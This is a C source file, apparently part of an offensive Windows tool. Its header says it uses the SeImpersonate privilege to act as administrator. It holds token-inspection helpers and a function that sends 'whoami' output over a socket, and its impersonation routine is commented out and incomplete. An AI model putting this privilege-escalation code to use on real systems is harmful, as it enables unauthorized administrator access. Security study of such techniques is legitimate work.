/*
* Author: Aleksa Zatezalo
* Date: September 2023
* Description: Uses the SEImpersonate Priveledge to act as an administrator. 
*/

#include "spoofer.h"
#include "doexec.h"
#include <sddl.h>
#include <userenv.h>
#include <stdlib.h>
#include <Lmcons.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <tlhelp32.h>
#include <tchar.h>

#define ERROR_NOT_ALL_ASSIGNED 1300L

int username(int sockfd){

    /*print Impersonator*/
    char *print_this = "\r\n\r\n[+] The Current User Is: ";
    send(sockfd, print_this, sizeof(char) * strlen(print_this), 0);
    
    char *whoami = "whoami\r\n";
    char *name = doexec(whoami, 0);
    send(sockfd, name, sizeof(char) * strlen(name), 0);
    free(name);
    return 0;
}

int createProc(char *proc){
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );

    // Start the child process. 
    if( !CreateProcess( NULL,   // No module name (use command line)
        proc,        // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        0,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi )           // Pointer to PROCESS_INFORMATION structure
    ) 
    {
        printf( "CreateProcess failed (%d).\n", GetLastError() );
    }

    // Wait until child process exits.
    WaitForSingleObject( pi.hProcess, INFINITE );

    // Close process and thread handles. 
    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );
    return 0;
}

HANDLE GetProcessTokenById(DWORD processId) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, processId);
    if (hProcess == NULL) {
        printf("Error opening process: %d\n", GetLastError());
        return NULL;
    }

    HANDLE hToken;
    if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
        printf("Error opening process token: %d\n", GetLastError());
        CloseHandle(hProcess);
        return NULL;
    }

    // Clean up the process handle, the token handle can be returned
    CloseHandle(hProcess);
    return hToken;
}

char *PrintUserInfoFromToken(DWORD processId) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, processId);
    char *error = "ERROR";
    char *result;
    char *banner = "ASSOCIATED USER: ";
    if (hProcess == NULL) {
        printf("Error opening process: %d\n", GetLastError());
        return error;
    }

    HANDLE hToken;
    if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
        printf("Error opening process token: %d\n", GetLastError());
        CloseHandle(hProcess);
        return error;
    }

    DWORD tokenInfoLength = 0;
    GetTokenInformation(hToken, TokenUser, NULL, 0, &tokenInfoLength);
    PTOKEN_USER pTokenUser = (PTOKEN_USER)malloc(tokenInfoLength);
    if (!GetTokenInformation(hToken, TokenUser, pTokenUser, tokenInfoLength, &tokenInfoLength)) {
        printf("Error getting token information: %d\n", GetLastError());
        free(pTokenUser);
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return error;
    }

    // Convert SID to string
    LPTSTR sidString;
    if (ConvertSidToStringSid(pTokenUser->User.Sid, &sidString)) {
        printf("User SID: %s\n", sidString);
        LocalFree(sidString);
    } else {
        printf("Error converting SID to string: %d\n", GetLastError());
    }

    // Get user name and domain
    DWORD userNameLen = 0;
    DWORD domainNameLen = 0;
    SID_NAME_USE sidType;
    
    LookupAccountSid(NULL, pTokenUser->User.Sid, NULL, &userNameLen, NULL, &domainNameLen, &sidType);
    
    TCHAR* userName = (TCHAR*)malloc(userNameLen * sizeof(TCHAR));
    TCHAR* domainName = (TCHAR*)malloc(domainNameLen * sizeof(TCHAR));

    if (!LookupAccountSid(NULL, pTokenUser->User.Sid, userName, &userNameLen, domainName, &domainNameLen, &sidType)) {
        result = "ERROR";
    }

    result = malloc(( strlen(banner) + strlen(userName) + strlen(domainName) + 2)*sizeof(char));
    strcpy(result, banner);
    strcat(result, domainName);
    strcat(result, "\\");
    strcat(result, userName);

    // Cleanup
    free(userName);
    free(domainName);
    free(pTokenUser);
    CloseHandle(hToken);
    CloseHandle(hProcess);
    return result;
}

void PrintError(LPTSTR msg) {
    DWORD errCode = GetLastError();
    LPVOID lpMsgBuf;

    FormatMessage(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        errCode,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPTSTR)&lpMsgBuf,
        0, NULL);

    _tprintf(TEXT("%s: %d - %s\n"), msg, errCode, (char*)lpMsgBuf);
    LocalFree(lpMsgBuf);
}

// int impersonate() {
//     HANDLE hToken = NULL;
//     HANDLE hImpersonatedToken = NULL;
//     DWORD sessionId = 0; // Replace with the actual session ID
//     BOOL result;

//     // Open the process token of the current process
//     result = OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);
//     if (!result) {
//         PrintError(TEXT("OpenProcessToken failed"));
//         return 1;
//     }

//     // Duplicate the token for impersonation
//     result = DuplicateToken(hToken, SecurityImpersonation, &hImpersonatedToken);
//     if (!result) {
//         PrintError(TEXT("DuplicateToken failed"));
//         CloseHandle(hToken);
//         return 1;
//     }

//     // Set the impersonation token
//     result = SetThreadToken(NULL, hImpersonatedToken);
//     if (!result) {
//         PrintError(TEXT("SetThreadToken failed"));
//         CloseHandle(hImpersonatedToken);
//         CloseHandle(hToken);
//         return 1;
//     }

//     // You are now impersonating the user. You can add code here to perform actions as the impersonated user.
//     char *hello = doexec("whoami", 0);
//     printf("%s", hello);
//     // Reset the thread token to NULL (revert to original token)
//     SetThreadToken(NULL, NULL);

//     // Clean up
//     CloseHandle(hImpersonatedToken);
//     CloseHandle(hToken);

//     _tprintf(TEXT("Impersonation successful\n"));
//     return 0;
// }